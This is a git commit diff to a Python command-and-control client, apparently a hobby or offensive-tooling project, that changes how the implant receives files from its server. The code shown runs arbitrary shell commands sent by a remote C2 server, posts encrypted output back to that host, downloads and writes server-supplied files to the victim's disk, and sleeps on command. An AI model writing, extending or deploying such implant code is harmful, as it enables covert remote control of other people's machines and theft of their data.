521cdfad20adff2653a3b8f3d6a0e54632fdd4d4
vincgonzo <vincgonzo@hotmail.fr>
2025-04-11 17:04:05 +0200

    dev(c2): download file mechanic

--- py_c2/client.py
+++ py_c2/client.py
@@ -8,14 +8,13 @@ import platform, socket, time
 from subprocess import PIPE, STDOUT, run
 from requests import exceptions, get, post
 from crypt import cipher
-from shutil import copyfileobj
 from settings import PORT, C2_SERVER, CMD_REQUEST, FILE_REQUEST, RESPONSE_PATH, CWD_RESPONSE, RESPONSE_KEY, HEADER, PROXY, HTTPStatusCode
 
 
 timestamp = str(int(time.time()))
 def post_to_server(msg, response_path=RESPONSE_PATH, response_key=RESPONSE_KEY):
     try:
-        encrypt_msg = cipher.encrypt(msg).decode()
+        encrypt_msg = cipher.encrypt(msg.encode())
         post(f"http://{C2_SERVER}:{PORT}{response_path}", data={response_key: encrypt_msg}, headers=HEADER, proxies=PROXY)
     except exceptions.RequestException as e:
         return e
@@ -56,11 +55,11 @@ while True:
         except OSError:
             post_to_server(f"There was an OS error on the client.\n")
         else:
-            post_to_server(getcwd().encode(), CWD_RESPONSE) # encode of getcwd needed
+            post_to_server(getcwd(), CWD_RESPONSE) # encode of getcwd needed
 
     elif not cmd.startswith('client'):
         cmd_output = run(cmd, shell=True, stdout=PIPE, stderr=STDOUT)
-        post_to_server(cmd_output.stdout)
+        post_to_server(cmd_output.stdout.decode())
 
     elif cmd.startswith('client download'):
         filename = None
@@ -71,7 +70,7 @@ while True:
             with get(f"http://{C2_SERVER}:{PORT}{FILE_REQUEST}{encrypted_filepath}", headers=HEADER, stream=True, proxies=PROXY) as response:
                 if response.status_code == HTTPStatusCode.OK:
                     with open(filename, "wb") as file_handle:
-                        copyfileobj(response.raw, file_handle)
+                        file_handle.write(cipher.decrypt(response.content))
                     post_to_server(f"{filename} is now on {client}.\n")
         except IndexError:
             post_to_server("You must enter the filename to download.")
@@ -84,14 +83,13 @@ while True:
 
     elif cmd.startswith('client sleep '): # sleep command
         try:
-            delay = float(cmd.split()[1])
+            delay = float(cmd.split()[2])
             if delay < 0:
                 raise ValueError
         except (IndexError, ValueError):
-            print(f"delay is : {delay}")
             post_to_server("You must Enter in a positive nbr for time sleeping in sec.\n")
         else:
-            post_to_server(f"{client} will sleep for {delay} seconds.\n")
+            # post_to_server(f"{client} will sleep for {delay} seconds.\n")
             time.sleep(delay)
             post_to_server(f"{client} is now awake.\n")
 
